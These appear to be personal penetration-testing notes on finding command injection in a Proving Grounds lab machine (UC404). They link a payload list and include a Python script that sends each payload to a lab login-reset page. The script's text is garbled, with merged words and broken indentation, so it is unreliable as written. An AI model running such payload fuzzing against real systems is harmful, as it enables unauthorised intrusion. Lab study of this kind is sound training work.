# Command Injection

Here is a list of some common injections

[https://github.com/payloadbox/command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)

You can identify this by using single or double quotes. It might look similar to a SQL injection at first. In this example from UC404 in proving grounds, you can see that when I add a single quote to the url query parameter, the bottom number turns from 1 to 2.

![Untitled](Command%20Injection%20523f96b7f977430b9fe00b21db2713df/Untitled.png)

You can use a python script like this to automate testing out the payloads.

```
#!/usr/bin/env python
importrequestsimportsyss = requests.Session()
url = "http://192.168.250.109/under_construction/forgot.php"
sc_file = sys.argv[1]
# Get website cookie, token ...?
s.get(url)

with open(sc_file, "r", encoding="iso-8859-1")as special_chars:
	sc = special_chars.readlines()
for ssin sc:
            ss = ss.strip()
            payload = {'email':ss}
            r = s.get(url, params=payload)
print(f"Trying payload:{payload}")
print(r.text.splitlines()[71:73])
print()
```

In my case, this payload worked.

![Untitled](Command%20Injection%20523f96b7f977430b9fe00b21db2713df/Untitled%201.png)